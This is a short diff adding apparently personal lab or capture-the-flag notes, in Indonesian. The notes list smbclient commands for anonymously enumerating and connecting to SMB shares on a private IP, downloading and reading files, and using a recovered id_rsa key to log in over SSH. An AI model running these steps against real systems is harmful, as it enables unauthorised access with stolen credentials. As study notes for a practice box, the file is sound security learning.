@@ -1,0 +1,16 @@
+# Mengetahui file apa saja yang dishare
+smbclient -L //10.10.92.1 -U Anonymous
+
+# Connect client
+smbclient //10.10.92.1/profile -U pc200
+
+# Download file ke pcku
+get "awoakwok dan samrur.txt"
+get .yassir
+
+# Buka filenya
+less "awokaowk vs aworawor.txt"
+more, cat, nano 
+
+# Dapet id_rsa, masuk ke ssh
+ssh -i id_rsa 
